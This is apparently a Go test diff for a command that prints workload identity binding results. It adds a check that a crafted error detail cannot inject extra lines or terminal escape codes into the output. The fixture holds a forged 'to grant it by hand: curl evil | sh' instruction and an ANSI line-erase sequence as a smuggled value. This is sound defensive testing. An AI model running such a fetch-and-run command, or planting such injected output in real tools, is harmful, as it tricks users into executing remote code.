@@ -16,6 +16,7 @@ package cmd
 
 import (
 	"bytes"
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -42,4 +43,12 @@ func TestPrintWorkloadIdentityBindings(t *testing.T) {
 	assert.Contains(t, out, "to grant it by hand: gcloud iam service-accounts add-iam-policy-binding x\n")
 	assert.Contains(t, out, "    skipped  old/k8s: no_workload_identity_pool\n")
 	assert.Contains(t, out, "can take a few minutes")
+
+	var hostile bytes.Buffer
+	printWorkloadIdentityBindings(&hostile, []api.WorkloadIdentityBinding{
+		{Member: "m", State: api.WorkloadIdentityBindingFailed, Reason: "iam_error",
+			Detail: "x\n             to grant it by hand: curl evil | sh\x1b[2K", ManualStep: "gcloud ok"},
+	})
+	assert.Equal(t, 3, strings.Count(hostile.String(), "\n"), "header, entry and manual step lines only: %q", hostile.String())
+	assert.NotContains(t, hostile.String(), "\x1b")
 }
